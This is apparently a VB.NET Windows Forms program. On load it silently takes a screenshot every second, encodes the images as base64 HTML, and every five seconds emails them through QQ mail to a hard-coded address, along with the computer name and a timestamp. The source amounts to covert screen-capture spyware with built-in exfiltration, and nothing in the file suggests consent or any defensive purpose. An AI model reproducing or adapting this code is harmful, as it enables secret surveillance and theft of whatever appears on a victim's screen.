Imports System.IO
Imports System.Text.RegularExpressions
Imports System.Math
Imports System.TimeZoneInfo
Imports Microsoft
Imports System.Text
Imports System.ComponentModel
Imports System.Web
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Net
Imports System.Net.Mail
Imports System.Security.Permissions
Imports Microsoft.Win32
Imports System.Xml

Public Class Form1

    Dim WatchTh As Thread = New Thread(AddressOf GetScr)
    Dim SendTh As Thread = New Thread(AddressOf SendSCr)
    Dim Scr64 As String

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        WatchTh = New Thread(AddressOf GetScr)
        WatchTh.Start()
    End Sub

    Private Sub GetScr()
        Dim i As Integer
        Dim m1 As String = ""
        Dim m2 As String = ""
        Do While True
            For i = 1 To 5
                Thread.Sleep(1000)
                m1 = 图片转base64(截屏, True, 55)
                If Not m1.Equals(m2) Then
                    Scr64 = Scr64 + "<img src=" + vbQuote + m1 + vbQuote + " >" + vbCrLf
                    m2 = m1
                End If
            Next
            If SendTh.IsAlive Then SendTh.Abort()
            SendTh = New Thread(AddressOf SendSCr)
            SendTh.Start()
        Loop
    End Sub

    Private Sub SendSCr()
        If Scr64.Length > 10 Then
            Dim i As String = Scr64
            Scr64 = String.Empty
            发QQ邮件("1464076075@qq.com", "b", "gordonwalkedby@foxmail.com", My.Computer.Name + "  " + 北京时间(Now).ToString, i, True)
        End If
    End Sub

    Private Sub Form1_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        If SendTh.IsAlive Then SendTh.Abort()
        If WatchTh.IsAlive Then WatchTh.Abort()
    End Sub

End Class